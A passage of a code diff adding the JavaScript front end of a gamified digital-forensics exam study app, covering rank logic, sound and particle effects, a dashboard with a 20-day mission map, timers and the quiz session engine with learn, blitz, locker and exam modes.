+      let cur = RANKS[0], nxt = RANKS[1];
+      for (let i = 0; i < RANKS.length; i++) {
+        if (xp >= RANKS[i].minXp) { cur = RANKS[i]; nxt = RANKS[i + 1] || null; }
+      }
+      return { cur, nxt };
+    }
+
+    // ==================== AUDIO SFX (Web Audio Synth) ====================
+    let audioCtx = null;
+    function playSfx(type) {
+      if (!state.audioOn) return;
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const now = audioCtx.currentTime;
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        if (type === 'ok') {
+          osc.type = 'triangle';
+          osc.frequency.setValueAtTime(520, now);
+          osc.frequency.exponentialRampToValueAtTime(880, now + 0.12);
+          gain.gain.setValueAtTime(0.12, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
+          osc.start(now); osc.stop(now + 0.19);
+        } else if (type === 'bad') {
+          osc.type = 'sawtooth';
+          osc.frequency.setValueAtTime(220, now);
+          osc.frequency.exponentialRampToValueAtTime(110, now + 0.18);
+          gain.gain.setValueAtTime(0.1, now);
+          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.22);
+          osc.start(now); osc.stop(now + 0.23);
+        } else if (type === 'win') {
+          [523, 659, 784, 1046].forEach((f, idx) => {
+            const o = audioCtx.createOscillator();
+            const g = audioCtx.createGain();
+            o.type = 'sine';
+            o.frequency.setValueAtTime(f, now + idx * 0.08);
+            g.gain.setValueAtTime(0.1, now + idx * 0.08);
+            g.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.2);
+            o.connect(g); g.connect(audioCtx.destination);
+            o.start(now + idx * 0.08); o.stop(now + idx * 0.08 + 0.22);
+          });
+        }
+      } catch {}
+    }
+
+    // ==================== PARTICLE FX CANVAS ====================
+    const fxCanvas = $('fx-canvas');
+    const fxCtx = fxCanvas.getContext('2d');
+    let particles = [];
+    function resizeCanvas() {
+      fxCanvas.width = window.innerWidth;
+      fxCanvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    function burstParticles(color = '#22d3ee', count = 26) {
+      const cx = window.innerWidth / 2;
+      const cy = window.innerHeight * 0.35;
+      for (let i = 0; i < count; i++) {
+        const angle = Math.random() * Math.PI * 2;
+        const speed = 2.5 + Math.random() * 6.5;
+        particles.push({
+          x: cx, y: cy,
+          vx: Math.cos(angle) * speed,
+          vy: Math.sin(angle) * speed - 2,
+          life: 1,
+          size: 3 + Math.random() * 4,
+          color
+        });
+      }
+    }
+
+    function animateFx() {
+      fxCtx.clearRect(0, 0, fxCanvas.width, fxCanvas.height);
+      particles = particles.filter(p => p.life > 0);
+      for (const p of particles) {
+        p.x += p.vx;
+        p.y += p.vy;
+        p.vy += 0.16;
+        p.life -= 0.024;
+        fxCtx.globalAlpha = Math.max(0, p.life);
+        fxCtx.fillStyle = p.color;
+        fxCtx.fillRect(p.x, p.y, p.size, p.size);
+      }
+      fxCtx.globalAlpha = 1;
+      requestAnimationFrame(animateFx);
+    }
+    animateFx();
+
+    // ==================== TOAST & MODAL ====================
+    function showToast(msg, tone = 'cyan') {
+      const colors = {
+        cyan: 'border-cyan-400/50 text-cyan-200',
+        green: 'border-emerald-400/50 text-emerald-200',
+        amber: 'border-amber-400/50 text-amber-200',
+        red: 'border-rose-400/50 text-rose-200'
+      };
+      const el = document.createElement('div');
+      el.className = `glass px-4 py-2.5 rounded-xl border text-xs font-bold font-mono-tech animate-pop ${colors[tone] || colors.cyan}`;
+      el.textContent = msg;
+      $('toast-container').appendChild(el);
+      setTimeout(() => el.remove(), 2700);
+    }
+
+    function openModal(html) {
+      $('modal-box').innerHTML = html;
+      $('modal-overlay').classList.remove('hidden');
+      $('modal-overlay').classList.add('flex');
+      lucide.createIcons();
+    }
+
+    function closeModal() {
+      $('modal-overlay').classList.add('hidden');
+      $('modal-overlay').classList.remove('flex');
+    }
+
+    $('modal-overlay').addEventListener('click', e => {
+      if (e.target === $('modal-overlay')) closeModal();
+    });
+
+    // ==================== HUD UPDATE ====================
+    function updateHUD() {
+      const total = QUESTIONS.length;
+      const verified = QUESTIONS.filter(q => state.answered[q.id]?.correct).length;
+      const pct = total ? Math.round((verified / total) * 100) : 0;
+      const { cur } = getRank(state.xp);
+
+      $('hud-day-pill').textContent = `DAY ${state.selectedDay}`;
+      $('hud-mastered-count').textContent = `${verified} / ${total}`;
+      $('hud-rank-label').textContent = `${cur.icon} ${cur.name}`;
+      $('hud-progress-bar').style.width = `${pct}%`;
+      $('hud-streak').textContent = `${state.streak}d`;
+      $('hud-xp').textContent = `${state.xp.toLocaleString()} XP`;
+      $('hud-locker-count').textContent = Object.keys(state.locker).length;
+
+      const audioBtn = $('btn-audio-hud');
+      audioBtn.innerHTML = `<i data-lucide="${state.audioOn ? 'volume-2' : 'volume-x'}" class="w-4 h-4"></i>`;
+      audioBtn.className = `p-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition ${state.audioOn ? 'text-cyan-300' : 'text-slate-500'}`;
+      lucide.createIcons();
+    }
+
+    // ==================== TIMERS ====================
+    function stopTimer() {
+      if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+    }
+
+    function startBlitzTimer() {
+      stopTimer();
+      let rem = session.timePerQ;
+      const tick = () => {
+        const fill = $('timer-fill');
+        const txt = $('timer-text');
+        if (!fill || !txt) return stopTimer();
+        fill.style.width = `${(rem / session.timePerQ) * 100}%`;
+        fill.className = `h-full transition-all duration-100 rounded-full ${rem <= 4 ? 'bg-rose-500' : 'bg-gradient-to-r from-cyan-400 to-purple-500'}`;
+        txt.textContent = `${rem.toFixed(1)}s`;
+        if (rem <= 0) {
+          stopTimer();
+          evaluateAnswer([], true);
+        }
+        rem = Math.max(0, rem - 0.1);
+      };
+      tick();
+      timerInterval = setInterval(tick, 100);
+    }
+
+    function startExamTimer() {
+      stopTimer();
+      const total = session.examSecondsLeft;
+      const tick = () => {
+        const fill = $('timer-fill');
+        const txt = $('timer-text');
+        if (!fill || !txt) return stopTimer();
+        const m = Math.floor(session.examSecondsLeft / 60);
+        const s = session.examSecondsLeft % 60;
+        txt.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+        fill.style.width = `${(session.examSecondsLeft / total) * 100}%`;
+        fill.className = `h-full transition-all duration-300 rounded-full ${session.examSecondsLeft <= 60 ? 'bg-rose-500' : 'bg-cyan-400'}`;
+        if (session.examSecondsLeft <= 0) {
+          stopTimer();
+          finishSession();
+        }
+        session.examSecondsLeft--;
+      };
+      tick();
+      timerInterval = setInterval(tick, 1000);
+    }
+
+    // ==================== VIEWS ====================
+    function renderHome() {
+      stopTimer();
+      route = 'home';
+      session = null;
+      const selMeta = DAYS_META[state.selectedDay - 1];
+      const dayQs = QUESTIONS.filter(q => q.day === state.selectedDay);
+      const dayDone = dayQs.filter(q => state.answered[q.id]?.correct).length;
+      const { cur, nxt } = getRank(state.xp);
+      const rankPct = nxt ? Math.min(100, Math.round(((state.xp - cur.minXp) / (nxt.minXp - cur.minXp)) * 100)) : 100;
+      const lockerCount = Object.keys(state.locker).length;
+
+      root.innerHTML = `
+        <!-- HERO BANNER -->
+        <section class="glass rounded-3xl p-5 sm:p-6 mb-6 neon-glow-cyan relative overflow-hidden">
+          <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-5">
+            <div class="flex items-start gap-4">
+              <div class="w-16 h-16 rounded-2xl bg-slate-900/90 border border-white/15 flex items-center justify-center text-3xl animate-float shrink-0">
+                ${selMeta.emoji}
+              </div>
+              <div>
+                <div class="flex flex-wrap items-center gap-2 mb-1">
+                  <span class="px-2.5 py-0.5 rounded-full text-[11px] font-black font-mono-tech bg-emerald-500/20 text-emerald-300 border border-emerald-400/30">CASE FILE ${String(selMeta.day).padStart(2, '0')}</span>
+                  <span class="text-xs text-slate-400 font-mono-tech">Boss: ${selMeta.boss}</span>
+                </div>
+                <h1 class="text-xl sm:text-2xl font-black tracking-tight">${selMeta.name}: <span class="text-cyan-300">${selMeta.domain}</span></h1>
+                <p class="text-xs sm:text-sm text-slate-400 mt-1">
+                  ${dayQs.length ? `${dayDone} / ${dayQs.length} evidence items verified · Shortcuts: <span class="kbd-chip">1-4</span> <span class="kbd-chip">A-D</span> <span class="kbd-chip">Enter</span> <span class="kbd-chip">F</span>` : 'Batch pending — drop Day ' + selMeta.day + ' into questions-extra.js to unlock.'}
+                </p>
+              </div>
+            </div>
+
+            <div class="flex flex-col sm:items-end gap-2 min-w-[240px]">
+              <div class="flex items-center justify-between w-full text-xs font-mono-tech">
+                <span class="${cur.color} font-bold">${cur.icon} ${cur.name}</span>
+                <span class="text-slate-400">${nxt ? `Next: ${nxt.name} (${nxt.minXp} XP)` : 'MAX RANK'}</span>
+              </div>
+              <div class="w-full h-2 rounded-full bg-slate-900 overflow-hidden border border-white/10">
+                <div class="h-full bg-gradient-to-r from-cyan-400 to-purple-500" style="width:${rankPct}%"></div>
+              </div>
+              <div class="flex flex-wrap gap-2 mt-1">
+                <button id="btn-play-day" ${dayQs.length ? '' : 'disabled'} class="px-4 py-2 rounded-xl font-bold text-xs sm:text-sm transition flex items-center gap-2 ${dayQs.length ? 'bg-gradient-to-r from-emerald-400 to-cyan-400 text-slate-950 hover:brightness-110 shadow-lg' : 'bg-slate-800 text-slate-500 cursor-not-allowed'}">
+                  <i data-lucide="play" class="w-4 h-4"></i> Open Day ${selMeta.day} Case File
+                </button>
+                <button id="btn-open-codex" class="px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs sm:text-sm font-bold text-slate-200 transition flex items-center gap-1.5">
+                  <i data-lucide="book-open" class="w-4 h-4 text-cyan-300"></i> Codex
+                </button>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- 4 ARCADE MODES -->
+        <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
+          <button id="card-learn" class="glass rounded-2xl p-4 text-left hover:border-emerald-400/50 transition group">
+            <div class="flex items-center justify-between mb-3">
+              <span class="px-2 py-0.5 rounded-md text-[10px] font-black font-mono-tech bg-emerald-500/20 text-emerald-300 border border-emerald-400/30">SEQUENTIAL</span>
+              <span class="text-xl">📁</span>
+            </div>
+            <h3 class="font-extrabold text-base group-hover:text-emerald-300 transition">Daily Case File</h3>
+            <p class="text-xs text-slate-400 mt-1">Learn Mode with instant explanations, memory hooks, and manual progression.</p>
+            <div class="mt-3 pt-2.5 border-t border-white/10 flex justify-between text-[11px] font-mono-tech text-slate-400">
+              <span>Day ${state.selectedDay}</span>
+              <span class="text-emerald-300 font-bold">LAUNCH →</span>
+            </div>
+          </button>
+
+          <button id="card-blitz" class="glass rounded-2xl p-4 text-left hover:border-rose-400/50 transition group">
+            <div class="flex items-center justify-between mb-3">
+              <span class="px-2 py-0.5 rounded-md text-[10px] font-black font-mono-tech bg-rose-500/20 text-rose-300 border border-rose-400/30">15s TIMED</span>
+              <span class="text-xl">⚡</span>
+            </div>
+            <h3 class="font-extrabold text-base group-hover:text-rose-300 transition">Incident Triage</h3>
+            <p class="text-xs text-slate-400 mt-1">Rapid-fire speed blitz with up to 5x combo XP multipliers for exam speed.</p>
+            <div class="mt-3 pt-2.5 border-t border-white/10 flex justify-between text-[11px] font-mono-tech text-slate-400">
+              <span>Best: ${state.bestCombo}x</span>
+              <span class="text-rose-300 font-bold">BLITZ →</span>
+            </div>
+          </button>
+
+          <button id="card-locker" class="glass rounded-2xl p-4 text-left hover:border-amber-400/50 transition group">
+            <div class="flex items-center justify-between mb-3">
+              <span class="px-2 py-0.5 rounded-md text-[10px] font-black font-mono-tech bg-amber-500/20 text-amber-300 border border-amber-400/30">2x TO CLEAR</span>
+              <span class="text-xl">🗄️</span>
+            </div>
+            <h3 class="font-extrabold text-base group-hover:text-amber-300 transition">Evidence Locker</h3>
+            <p class="text-xs text-slate-400 mt-1">Missed &amp; flagged items stay locked until you nail them twice in a row.</p>
+            <div class="mt-3 pt-2.5 border-t border-white/10 flex justify-between text-[11px] font-mono-tech text-slate-400">
+              <span>Pending: ${lockerCount}</span>
+              <span class="text-amber-300 font-bold">OPEN →</span>
+            </div>
+          </button>
+
+          <button id="card-exam" class="glass rounded-2xl p-4 text-left hover:border-purple-400/50 transition group">
+            <div class="flex items-center justify-between mb-3">
+              <span class="px-2 py-0.5 rounded-md text-[10px] font-black font-mono-tech bg-purple-500/20 text-purple-300 border border-purple-400/30">MOCK TEST</span>
+              <span class="text-xl">⚖️</span>
+            </div>
+            <h3 class="font-extrabold text-base group-hover:text-purple-300 transition">Courtroom Exam</h3>
+            <p class="text-xs text-slate-400 mt-1">Randomized timed exam with 70% pass gate and full post-exam debrief.</p>
+            <div class="mt-3 pt-2.5 border-t border-white/10 flex justify-between text-[11px] font-mono-tech text-slate-400">
+              <span>Best: ${state.bestExamScore !== null ? state.bestExamScore + '%' : '--'}</span>
+              <span class="text-purple-300 font-bold">ENTER →</span>
+            </div>
+          </button>
+        </section>
+
+        <!-- 20-DAY MISSION MAP -->
+        <section>
+          <div class="flex flex-wrap items-end justify-between gap-2 mb-4">
+            <div>
+              <h2 class="text-lg font-black tracking-tight flex items-center gap-2">
+                <i data-lucide="map" class="w-5 h-5 text-cyan-400"></i> 20-DAY FORENSICS MISSION MAP
+              </h2>
+              <p class="text-xs text-slate-400">Click any unlocked Case File to select it, or double-click to launch immediately.</p>
+            </div>
+            <span class="px-3 py-1 rounded-full text-xs font-mono-tech font-bold bg-slate-900 border border-white/10 text-emerald-300">
+              Loaded Bank: ${QUESTIONS.length} MCQs
+            </span>
+          </div>
+
+          <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-3">
+            ${DAYS_META.map(d => {
+              const qs = QUESTIONS.filter(q => q.day === d.day);
+              const loaded = qs.length > 0;
+              const attempted = qs.filter(q => state.answered[q.id]).length;
+              const verified = qs.filter(q => state.answered[q.id]?.correct).length;
+              const pct = loaded ? Math.round((verified / qs.length) * 100) : 0;
+              const acc = attempted ? Math.round((verified / attempted) * 100) : 0;
+              const isSel = state.selectedDay === d.day;
+              return `
+                <div data-day="${d.day}" class="day-tile glass rounded-2xl p-3.5 transition cursor-pointer ${isSel ? 'ring-2 ring-cyan-400 neon-glow-cyan' : 'hover:border-white/25'} ${!loaded ? 'opacity-45' : ''}">
+                  <div class="flex items-center justify-between mb-1.5">
+                    <span class="text-[11px] font-black font-mono-tech text-cyan-300">DAY ${String(d.day).padStart(2, '0')}</span>
+                    <span class="text-lg">${d.emoji}</span>
+                  </div>
+                  <div class="font-bold text-xs text-white truncate">${d.name}</div>
+                  <div class="text-[11px] text-slate-400 truncate mb-2.5">${d.domain}</div>
+                  <div class="h-1.5 rounded-full bg-slate-900 overflow-hidden border border-white/10 mb-2">
+                    <div class="h-full bg-emerald-400" style="width:${pct}%"></div>
+                  </div>
+                  <div class="flex justify-between text-[10px] font-mono-tech text-slate-400">
+                    <span>${loaded ? `${verified}/${qs.length} (${pct}%)` : 'PENDING'}</span>
+                    <span>${attempted ? `${acc}% acc` : '--'}</span>
+                  </div>
+                </div>
+              `;
+            }).join('')}
+          </div>
+        </section>
+      `;
+
+      lucide.createIcons();
+
+      $('btn-play-day')?.addEventListener('click', () => startLearnMode(state.selectedDay));
+      $('card-learn')?.addEventListener('click', () => startLearnMode(state.selectedDay));
+      $('card-blitz')?.addEventListener('click', startSpeedBlitz);
+      $('card-locker')?.addEventListener('click', startEvidenceLocker);
+      $('card-exam')?.addEventListener('click', renderExamSetup);
+      $('btn-open-codex')?.addEventListener('click', renderCodex);
+
+      document.querySelectorAll('.day-tile').forEach(tile => {
+        const d = Number(tile.dataset.day);
+        tile.addEventListener('click', () => {
+          state.selectedDay = d;
+          saveState();
+          renderHome();
+        });
+        tile.addEventListener('dblclick', () => {
+          state.selectedDay = d;
+          saveState();
+          startLearnMode(d);
+        });
+      });
+    }
+
+    // ==================== SESSION ENGINE ====================
+    function startLearnMode(day) {
+      const qs = QUESTIONS.filter(q => q.day === day);
+      if (!qs.length) return showToast(`Day ${day} batch not loaded yet.`, 'amber');
+      const meta = DAYS_META[day - 1];
+      initSession({
+        mode: 'learn',
+        title: `Day ${day}: ${meta.name}`,
+        badge: 'CASE FILE // LEARN',
+        badgeStyle: 'bg-emerald-500/20 text-emerald-300 border-emerald-400/30',
+        questions: qs
+      });
+    }
+
+    function startSpeedBlitz() {
+      if (!QUESTIONS.length) return showToast('No questions loaded.', 'red');
+      const pool = [...QUESTIONS].sort(() => Math.random() - 0.5).slice(0, 20);
+      initSession({
+        mode: 'blitz',
+        title: 'Incident Triage — 15s Speed Blitz',
+        badge: 'SPEED BLITZ',
+        badgeStyle: 'bg-rose-500/20 text-rose-300 border-rose-400/30',
+        questions: pool,
+        timePerQ: 15
+      });
+    }
+
+    function startEvidenceLocker() {
+      const ids = Object.keys(state.locker);
+      if (!ids.length) return showToast('Evidence Locker is empty! Clean sweep.', 'green');
+      const qs = QUESTIONS.filter(q => ids.includes(q.id));
+      if (!qs.length) return showToast('No matching locker items in loaded bank.', 'amber');
+      initSession({
+        mode: 'locker',
+        title: 'Evidence Locker (2x Streak to Clear)',
+        badge: 'EVIDENCE LOCKER',
+        badgeStyle: 'bg-amber-500/20 text-amber-300 border-amber-400/30',
+        questions: qs
+      });
+    }
+
+    function initSession(cfg) {
+      touchStreak();
+      saveState();
+      route = 'session';
+      session = {
+        ...cfg,
+        index: 0,
+        score: 0,
+        xpEarned: 0,
+        combo: 0,
+        answeredCurrent: false,
+        selectedMulti: new Set(),
+        results: []
+      };
+      renderSessionQuestion();
+      if (session.mode === 'exam') startExamTimer();
+    }
+
+    function renderSessionQuestion() {
+      const q = session.questions[session.index];
+      session.answeredCurrent = false;
+      session.selectedMulti = new Set();
+      const isMulti = Array.isArray(q.answer);
+      const isFlagged = Boolean(state.locker[q.id]?.flagged);
+      const lockerStreak = state.locker[q.id]?.streak ?? 0;
+      const letters = ['A', 'B', 'C', 'D', 'E', 'F'];
+
+      root.innerHTML = `
+        <div class="max-w-4xl mx-auto animate-pop">
+          <!-- Session Top Bar -->
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <button id="btn-back-dash" class="px-3 py-1.5 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-xs font-bold text-slate-300 transition flex items-center gap-1.5">
+              ← Dashboard <span class="kbd-chip">Esc</span>
+            </button>
+            <div class="flex items-center gap-2">
+              <span class="px-2.5 py-0.5 rounded-md text-[11px] font-black font-mono-tech border ${session.badgeStyle}">${session.badge}</span>
+              <span class="font-extrabold text-sm sm:text-base">${session.title}</span>
+            </div>
+            <div class="flex items-center gap-2 font-mono-tech text-xs font-bold">
+              ${session.mode === 'blitz' ? `<span id="combo-badge" class="px-2.5 py-1 rounded-full bg-amber-500/20 text-amber-300 border border-amber-400/30">COMBO ${Math.min(5, session.combo + 1)}x</span>` : ''}
+              <span class="px-2.5 py-1 rounded-full bg-slate-900 border border-white/10 text-cyan-300">${session.index + 1} / ${session.questions.length}</span>
+            </div>
+          </div>
+
+          ${(session.mode === 'blitz' || session.mode === 'exam') ? `
+            <div class="flex items-center gap-3 mb-4">
+              <div class="flex-1 h-3 rounded-full bg-slate-900 border border-white/10 overflow-hidden ${session.mode === 'blitz' ? 'conveyor-track' : ''}">
+                <div id="timer-fill" class="h-full bg-cyan-400 rounded-full" style="width:100%"></div>
+              </div>
+              <span id="timer-text" class="font-mono-tech text-xs font-bold text-cyan-300 min-w-[54px] text-right">--</span>
+            </div>
+          ` : ''}
+
+          <!-- Question Card -->
+          <div id="q-card" class="case-panel rounded-3xl p-5 sm:p-7">
+            <div class="flex flex-wrap items-center justify-between gap-2 mb-4">
+              <div class="flex flex-wrap items-center gap-2">
+                <span class="px-2.5 py-0.5 rounded-md text-[11px] font-mono-tech font-bold bg-slate-900 border border-white/15 text-cyan-300">${q.id}</span>
+                <span class="px-2.5 py-0.5 rounded-md text-[11px] font-mono-tech bg-white/5 border border-white/10 text-slate-300">${q.domain}</span>
+                ${q.auditFlag ? `<span class="px-2.5 py-0.5 rounded-md text-[11px] font-mono-tech font-bold bg-amber-500/20 text-amber-300 border border-amber-400/40">⚠ ${q.auditFlag.type === 'errata' ? 'EXAM KEY ERRATA' : 'MEDIA TRANSCRIBED'}</span>` : ''}
+                ${session.mode === 'locker' ? `<span class="px-2.5 py-0.5 rounded-md text-[11px] font-mono-tech font-bold bg-purple-500/20 text-purple-200 border border-purple-400/40">STREAK ${lockerStreak}/2</span>` : ''}
+              </div>
+              <button id="btn-flag-q" class="px-3 py-1.5 rounded-xl text-xs font-bold font-mono-tech border transition flex items-center gap-1.5 ${isFlagged ? 'bg-amber-500/25 text-amber-200 border-amber-400' : 'bg-white/5 text-slate-300 border-white/10 hover:border-amber-400/50'}">
+                ⚑ ${isFlagged ? 'Flagged' : 'Flag'} <span class="kbd-chip">F</span>
+              </button>
+            </div>
+
+            <div class="text-base sm:text-lg font-semibold leading-relaxed text-white mb-4">${escapeHtml(q.question)}</div>
+
+            ${q.evidence ? `<pre class="bg-slate-950/90 border border-cyan-500/30 border-l-4 border-l-cyan-400 rounded-xl p-4 mb-5 font-mono-tech text-xs text-cyan-200 overflow-x-auto whitespace-pre-wrap">${escapeHtml(q.evidence)}</pre>` : ''}
+
+            ${isMulti ? `<div class="text-xs font-mono-tech font-bold text-amber-300 mb-3">⚡ MULTI-SELECT: Choose all correct answers, then click Verify or press Enter.</div>` : ''}
+
+            <div id="options-wrap" class="grid gap-2.5">
+              ${q.options.map((opt, idx) => `
+                <button data-idx="${idx}" class="opt-btn w-full text-left p-3.5 sm:p-4 rounded-2xl bg-slate-900/75 hover:bg-slate-800/90 border border-white/10 hover:border-cyan-400/60 transition flex items-start gap-3">
+                  <span class="kbd-chip shrink-0 mt-0.5">${letters[idx] || idx + 1}</span>
+                  <span class="text-sm sm:text-[15px] text-slate-100">${escapeHtml(opt)}</span>
+                </button>
+              `).join('')}
+            </div>
+
+            ${isMulti ? `
+              <div id="multi-submit-area" class="mt-4">
+                <button id="btn-verify-multi" class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-400 to-cyan-400 text-slate-950 font-black text-sm hover:brightness-110 transition">
+                  Verify Selected Evidence [Enter]
+                </button>
+              </div>
+            ` : ''}
+
+            <div id="feedback-area" class="hidden mt-5"></div>
+          </div>
+        </div>
+      `;
+
+      lucide.createIcons();
+      $('btn-back-dash').addEventListener('click', renderHome);
+      $('btn-flag-q').addEventListener('click', toggleFlagCurrent);
+      document.querySelectorAll('.opt-btn').forEach(btn => {
+        btn.addEventListener('click', () => handleOptionClick(Number(btn.dataset.idx)));
+      });
+      $('btn-verify-multi')?.addEventListener('click', () => {
+        if (session.selectedMulti.size > 0) evaluateAnswer([...session.selectedMulti], false);
+      });
+
+      if (session.mode === 'blitz') startBlitzTimer();
+    }
+
+    function toggleFlagCurrent() {
+      if (!session) return;
+      const q = session.questions[session.index];
+      if (!state.locker[q.id]) {
+        state.locker[q.id] = { streak: 0, flagged: true, missed: false };
+        showToast('Pinned to Evidence Locker', 'amber');
+      } else {
+        state.locker[q.id].flagged = !state.locker[q.id].flagged;
+        if (!state.locker[q.id].flagged && !state.locker[q.id].missed) {
+          delete state.locker[q.id];
+          showToast('Removed flag', 'cyan');
+        }
+      }
+      saveState();
+      const btn = $('btn-flag-q');
+      const isF = Boolean(state.locker[q.id]?.flagged);
+      if (btn) {
+        btn.className = `px-3 py-1.5 rounded-xl text-xs font-bold font-mono-tech border transition flex items-center gap-1.5 ${isF ? 'bg-amber-500/25 text-amber-200 border-amber-400' : 'bg-white/5 text-slate-300 border-white/10 hover:border-amber-400/50'}`;
+        btn.innerHTML = `⚑ ${isF ? 'Flagged' : 'Flag'} <span class="kbd-chip">F</span>`;
+      }
+    }
+
+    function handleOptionClick(idx) {
+      if (!session || session.answeredCurrent) return;
+      const q = session.questions[session.index];
+      if (Array.isArray(q.answer)) {
+        if (session.selectedMulti.has(idx)) session.selectedMulti.delete(idx);
+        else session.selectedMulti.add(idx);
+        document.querySelectorAll('.opt-btn').forEach(b => {
+          const on = session.selectedMulti.has(Number(b.dataset.idx));
+          b.classList.toggle('ring-2', on);
+          b.classList.toggle('ring-cyan-400', on);
+          b.classList.toggle('bg-cyan-500/15', on);
+        });
+      } else {
+        evaluateAnswer([idx], false);
+      }
+    }
+
+    function evaluateAnswer(chosen, timedOut) {
+      if (!session || session.answeredCurrent) return;
+      session.answeredCurrent = true;
+      if (session.mode === 'blitz') stopTimer();
+
+      const q = session.questions[session.index];
+      const correctArr = Array.isArray(q.answer) ? [...q.answer].sort() : [q.answer];
+      const chosenArr = [...chosen].sort();
+      const isCorrect = !timedOut && correctArr.length === chosenArr.length && correctArr.every((v, i) => v === chosenArr[i]);
+
+      session.results.push({ q, isCorrect, chosen: chosenArr });
+
+      const prev = state.answered[q.id] || { correct: false, attempts: 0, hits: 0 };
+      state.answered[q.id] = {
+        correct: prev.correct || isCorrect,
+        attempts: prev.attempts + 1,
+        hits: prev.hits + (isCorrect ? 1 : 0)
+      };
+
+      let gainedXp = 0;
+      if (isCorrect) {
+        session.score++;
+        session.combo++;
+        if (session.mode === 'blitz') {
+          const mult = Math.min(5, session.combo);
+          if (mult > state.bestCombo) state.bestCombo = mult;
+          gainedXp = 10 * mult;
+        } else {
+          gainedXp = 15;
+        }
+        state.xp += gainedXp;
+        session.xpEarned += gainedXp;
+        if (session.mode !== 'exam') {
+          playSfx('ok');
+          burstParticles('#10b981', 22);
+        }
+      } else {
+        session.combo = 0;
+        state.locker[q.id] = {
+          streak: 0,
+          flagged: state.locker[q.id]?.flagged || false,
+          missed: true
+        };
+        if (session.mode !== 'exam') {
+          playSfx('bad');
+          $('q-card')?.classList.add('animate-shake');
+        }
+      }
+
+      if (session.mode === 'locker' && state.locker[q.id]) {
+        if (isCorrect) {
+          state.locker[q.id].streak += 1;
+          if (state.locker[q.id].streak >= 2) {
+            delete state.locker[q.id];
+            state.lockerCleared++;
+            showToast(`CLEARED: ${q.id} nailed 2x in a row!`, 'green');
+          }
+        } else {
+          state.locker[q.id].streak = 0;
+        }
+      }
+
+      saveState();
+
+      // Exam mode advances immediately without showing answers
+      if (session.mode === 'exam') {
+        advanceQuestion();
+        return;
+      }
+
+      // Lock & color options
+      document.querySelectorAll('.opt-btn').forEach(b => {
+        b.disabled = true;
+        const i = Number(b.dataset.idx);
+        b.classList.remove('hover:bg-slate-800/90', 'hover:border-cyan-400/60', 'ring-2', 'ring-cyan-400', 'bg-cyan-500/15');
+        if (correctArr.includes(i)) {
+          b.classList.add('border-emerald-400', 'bg-emerald-500/15');
+        } else if (chosenArr.includes(i)) {
+          b.classList.add('border-rose-500', 'bg-rose-500/15');
+        } else {
+          b.classList.add('opacity-50');
+        }
+      });
+      $('multi-submit-area')?.classList.add('hidden');
+
+      const fb = $('feedback-area');
+      fb.classList.remove('hidden');
+      fb.innerHTML = `
+        <div class="rounded-2xl p-4 sm:p-5 border animate-pop ${isCorrect ? 'bg-emerald-950/40 border-emerald-400/50' : 'bg-rose-950/40 border-rose-500/50'}">
+          <div class="flex items-center justify-between font-mono-tech text-xs sm:text-sm font-black mb-2">
+            <span class="${isCorrect ? 'text-emerald-300' : 'text-rose-300'}">
+              ${timedOut ? '⏱ TIME EXPIRED — EVIDENCE MISSED' : isCorrect ? '✓ VERIFIED EVIDENCE' : '✕ ALERT — INCORRECT ANALYSIS'}
+            </span>
+            <span class="${isCorrect ? 'text-cyan-300' : 'text-amber-300'}">${isCorrect ? `+${gainedXp} XP` : 'Routed to Locker'}</span>
+          </div>
+          <p class="text-sm text-slate-200 leading-relaxed">${escapeHtml(q.explanation)}</p>
+          ${q.auditFlag ? `
+            <div class="mt-3 p-3 rounded-xl bg-amber-500/15 border border-amber-400/40 text-xs text-amber-200">
+              <strong>⚠ Audit Note:</strong> ${escapeHtml(q.auditFlag.note)}
+            </div>
+          ` : ''}
+          <div class="mt-4 flex justify-end">
+            <button id="btn-next-evidence" class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-400 to-cyan-400 text-slate-950 font-black text-xs sm:text-sm hover:brightness-110 transition">
+              ${session.index === session.questions.length - 1 ? 'Complete Mission → [Enter]' : 'Next Evidence → [Enter / Space]'}
+            </button>
+          </div>
+        </div>
+      `;
+      $('btn-next-evidence').addEventListener('click', advanceQuestion);
+    }
+
+    function advanceQuestion() {
+      if (!session) return;
+      if (session.index < session.questions.length - 1) {
+        session.index++;
+        renderSessionQuestion();
+      } else {
+        finishSession();
+      }
+    }
+
+    function finishSession() {
+      stopTimer();
+      route = 'summary';
+      const total = session.results.length;
+      const acc = total ? Math.round((session.score / total) * 100) : 0;
+      const missed = session.results.filter(r => !r.isCorrect);
+
+      if (session.mode === 'exam') {
+        if (state.bestExamScore === null || acc > state.bestExamScore) state.bestExamScore = acc;
+        saveState();
+      }
+      if (acc >= 70) { playSfx('win'); burstParticles('#facc15', 45); }
+
+      root.innerHTML = `
+        <div class="max-w-3xl mx-auto glass rounded-3xl p-6 sm:p-8 neon-glow-cyan animate-pop">
+          <div class="text-xs font-mono-tech font-bold ${acc >= 70 ? 'text-emerald-300' : 'text-amber-300'} mb-1">
+            ${session.mode === 'exam' ? (acc >= 70 ? '⚖️ COURTROOM VERDICT: PASSED (≥70%)' : '⚖️ COURTROOM VERDICT: NEEDS REVIEW (<70%)') : 'MISSION DEBRIEF'}
+          </div>
+          <h2 class="text-2xl font-black mb-5">${session.title}</h2>
+
+          <div class="grid grid-cols-3 gap-3 mb-6">
